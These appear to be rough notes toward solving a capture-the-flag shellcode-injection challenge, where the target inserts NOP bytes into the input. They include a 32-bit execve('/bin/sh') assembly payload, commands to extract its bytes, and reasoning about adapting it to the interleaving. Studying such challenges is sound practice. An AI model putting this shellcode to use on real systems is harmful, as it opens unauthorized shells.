we need to inject a shellcode in the input(upto 1000 bytes)
the code that is injected have 2 bytes from out input and 2 nop instructions(0x90)
at the end there is a return instruction(0xc3)
for some reason when the shell code length is odd then we have a non valid instruction appended int out input(-0x70)

we need to write a assembly code to get the shell code instructions and send it to the server
    in payload.asm we have assembly code to run the  execve("/bin/sh", NULL, NULL);   command
    nasm -f elf32 ./payload.asm && ld -m elf_i386 payload_gen.o -o payload 
    objdump -d ./payload|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 

One possible assembly code for 32bit processor
    global _start
        _start:
            xor eax, eax
            push eax
            push 0x68732f6e
            push 0x69622f2f
            mov ebx, esp
            push eax
            mov edx, esp
            push ebx
            mov ecx, esp
            mov al, 11
            int 0x80

this assembly code will not work because 
    in the execute function we are inserting two nop instructions after every two instructions from our chell code
    we cannot push more than 1 byte at a time as the nop instructions will come in between

Normally we have stack for string input "/bin/sh" in 32-little
    68 2f(/) 73(s) 68(h) 00(\0)       	push   \0hs/
	68 2f(/) 62(b) 69(i) 6e(n)      	push   nib/
    in memory
        0x77777777770              \0hs/
        0x77777777774              nib/

mul ecx - eax*=ecx
